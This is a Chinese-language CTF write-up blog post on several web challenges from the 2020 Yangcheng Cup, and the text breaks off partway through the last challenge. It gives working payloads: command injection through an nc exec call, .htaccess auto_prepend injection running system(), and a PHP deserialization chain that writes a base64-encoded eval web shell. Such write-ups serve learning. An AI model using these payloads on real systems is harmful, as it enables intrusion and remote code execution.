<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta name="baidu-site-verification" content="code-3wF2URfI6h" />
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.getflag.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
<meta property="og:type" content="website">
<meta property="og:title" content="kawhi">
<meta property="og:url" content="https://www.getflag.cn/index.html">
<meta property="og:site_name" content="kawhi">
<meta property="og:description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="kawhi">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.getflag.cn/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>kawhi</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">kawhi</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">webå¼Ÿå¼Ÿ</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>æ—¥ç¨‹è¡¨</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" class="post-title-link" itemprop="url">2020å¹´ã€Œç¾ŠåŸæ¯ã€ç½‘ç»œå®‰å…¨å¤§èµ›</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-09-11 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-11T00:00:00+08:00">2020-09-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:10:04" itemprop="dateModified" datetime="2020-10-16T11:10:04+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>è¿æ¥ä¸Šèšå‰‘åï¼Œå‘ç°<code>bbbbbbbbb.txt</code>æ–‡ä»¶ï¼Œbase64è§£ç ä¿å­˜ä¸ºå›¾ç‰‡å³å¯çœ‹åˆ°flagã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>æºç åœ¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/Hei_Mao_Jing_Chang.mp3</span><br></pre></td></tr></table></figure>

<p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>åŸé¢˜åœ¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://neversecure.ca/category/bug-hunting/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/</span><br><span class="line"><span class="comment">#postæäº¤</span></span><br><span class="line">Black-Cat-Sheriff=<span class="number">04</span>b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat+flag.php&amp;White-cat-monitor=%<span class="number">5</span>B%<span class="number">5</span>D</span><br></pre></td></tr></table></figure>

<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°åŸé¢˜ï¼š<code>X-NUCA&#39;2019â€”Ezphp</code></p>
<p>å‰æçŸ¥è¯†ï¼š</p>
<p><code>php.ini</code>ä¸­æœ‰ä¸¤é¡¹ï¼š</p>
<p>åœ¨æ‰€æœ‰é¡µé¢çš„é¡¶éƒ¨ä¸åº•éƒ¨requireæ–‡ä»¶</p>
<ul>
<li><p><code>auto_prepend_file</code> åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶</p>
</li>
<li><p><code>auto_append_file</code> åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</p>
</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<p>å°†<code>.htaccess</code>è¿™ä¸ªæ–‡ä»¶åŒ…å«è¿›æ‰€æœ‰çš„phpé¡µé¢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹äº<code>stristr()</code>çš„é»‘åå•è¿‡æ»¤ç›´æ¥ç”¨åæ–œæ å³å¯ç»•è¿‡</p>
<p>å¯¹äºåé¢æ‹¼æ¥è¿›æ¥çš„<code>&quot;\nHello World&quot;</code>éœ€è¦ç”¨åæ–œæ è½¬ä¹‰</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#x27;cat /f&#x27;.&#x27;lag&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p>é¦–å…ˆè®¿é—®<code>robots.txt</code>ï¼Œæç¤º<code>Disallow: /star1.php/</code>ï¼Œæºä»£ç é‡Œæœ‰:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  å°èƒ–è¯´ç”¨ä¸ªä¸å®‰å…¨çš„åè®®ä»æˆ‘å®¶æ‰èƒ½è¿›ser.phpå‘¢ï¼  !--&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸å®‰å…¨åè®®ç”¨<code>http</code>è®¿é—®ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾<code>file_put_contents</code>æ˜¯è¦å†™shellè¿›å»ï¼Œå¹¶ä¸”åœ¨å†…å®¹å‰åŠ äº†æ­»äº¡å‡½æ•°ï¼Œé‚æ„é€ é“¾æ¡ï¼Œè¿™é‡Œè§¦å‘<code>__toString</code>ï¼Œä½†æ˜¯æ²¡æœ‰åœ°æ–¹å¯ä»¥è§¦å‘ï¼Œç›²çŒœåº”è¯¥æ˜¯<code>echo unserialize</code>çš„ååºåˆ—å…¥å£ã€‚æ„é€ é“¾å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$GWHT = new GWHT();</span><br><span class="line">$GWHT-&gt;hero = new Yongen();</span><br><span class="line">$GWHT-&gt;hero-&gt;file = &#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;;</span><br><span class="line">$GWHT-&gt;hero-&gt;text = &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;;</span><br><span class="line">$a = serialize($GWHT);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•<code>/ffflag</code>å³å¯è·å¾—flagã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10024</span>/sandbox/hrnh1cvpq4bvbm960878icaodb/shell.php</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>

<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>é¦–å…ˆç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</span><br><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure>

<p>æºç ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; 